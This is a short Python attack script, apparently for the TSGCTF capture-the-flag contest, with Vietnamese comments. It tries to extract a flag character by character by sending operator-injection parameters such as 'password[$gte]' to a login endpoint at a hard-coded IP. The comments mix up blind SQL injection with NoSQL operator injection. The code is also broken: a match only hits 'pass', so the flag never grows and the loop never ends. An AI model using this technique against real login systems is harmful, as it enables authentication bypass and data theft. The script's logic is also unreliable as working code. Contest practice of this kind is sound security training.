import requests
import string

url = "http://35.221.67.248:10501/actions/login"
# Sắp xếp alphabet để tìm chính xác theo thứ tự ASCII
alphabet = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
flag = "TSGCTF{"

print("Bắt đầu Blind SQLi bằng kỹ thuật so sánh chuỗi...")

while True:
    found = False
    # Dò tìm ký tự tiếp theo bằng cách so sánh password > giá trị thử nghiệm
    for char in alphabet:
        test_val = flag + char
        
        # Chúng ta lợi dụng việc Express/Bun xử lý mảng để vượt qua kiểm tra dấu nháy
        # Nhưng ở đây, cách tốt nhất là dùng Blind dựa trên việc password >= test_val
        # Vì không dùng được dấu nháy, ta tận dụng chính các ký tự có sẵn trong DB
        
        params = {
            "name": "admin",
            # Thử nghiệm so sánh trực tiếp nếu server cho phép object injection vào câu lệnh so sánh
            "password[$gte]": test_val, 
            "password[dummy]": "1"
        }

        r = requests.get(url, params=params)
        
        # Nếu logic này không chạy, hãy quay lại dùng curl để kiểm tra dấu hiệu Welcome
        if "Welcome" in r.text:
            # Tiếp tục tinh chỉnh logic tìm kiếm ở đây
            pass